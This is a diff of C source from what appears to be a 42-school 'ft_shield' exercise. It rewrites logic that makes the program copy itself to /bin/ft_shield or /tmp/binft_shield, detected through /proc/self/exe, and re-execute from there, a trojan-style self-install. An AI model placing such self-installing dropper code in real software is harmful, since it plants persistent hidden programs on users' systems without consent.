@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/16 18:15:16 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/27 14:33:29 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/12/02 12:27:53 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,23 +28,34 @@ int	ctx_loop(t_ctx *ctx)
 	return (1);
 }
 
-int	main(int ac, char **av, char **envp)
+static void	handle_payload(bool root, char **envp)
 {
-	(void)ac;
-	t_ctx	ctx;
 	char	*payload_path;
-	memset(&ctx, 0, sizeof(t_ctx));
-
-	ctx.is_root = getuid() == 0;
-
-	if (ctx.is_root)
+	char	exec_path[4096] = {0};
+	
+	if (root)
 		payload_path = "/bin/ft_shield";
 	else
 		payload_path = "/tmp/binft_shield";
 
-	if (!strstr(av[0], payload_path)
-		&& export_payload(ctx.is_root, av[0], payload_path))
+	readlink("/proc/self/exe", exec_path, sizeof(exec_path));
+
+	if (strcmp(exec_path, payload_path)) // Not executed as payload, need to export it
+	{
+		export_payload(root, exec_path, payload_path);
 		exec_payload(payload_path, envp);
+	}
+}
+
+int	main(int ac, char **av, char **envp)
+{
+	(void)ac;(void)av;
+	t_ctx	ctx;	
+
+	memset(&ctx, 0, sizeof(t_ctx));
+	ctx.is_root = getuid() == 0;
+
+	handle_payload(ctx.is_root, envp);
 
 	if (!ctx_init(&ctx))
 		return (0);
